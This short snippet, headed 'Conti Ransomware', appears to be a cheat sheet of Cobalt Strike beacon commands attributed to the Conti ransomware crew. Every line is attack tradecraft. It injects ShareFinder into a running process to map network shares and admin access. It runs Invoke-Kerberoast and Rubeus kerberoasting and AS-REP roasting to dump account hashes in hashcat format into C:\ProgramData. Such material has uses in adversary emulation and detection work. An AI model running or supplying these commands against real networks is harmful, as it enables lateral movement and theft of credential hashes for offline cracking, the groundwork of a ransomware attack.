### Conti Ransomware 
```
powershell-import /home/user/work/ShareFinder.ps1
psinject 1234 x64 Invoke-ShareFinder -CheckAdmin -Verbose | Out-File -Encoding ascii C:\ProgramData\sh.txt

powershell-import /home/user/work/Invoke-Kerberoast.ps1
psinject 4728 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -Encoding UTF8

execute-assembly /home/user/work/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
```

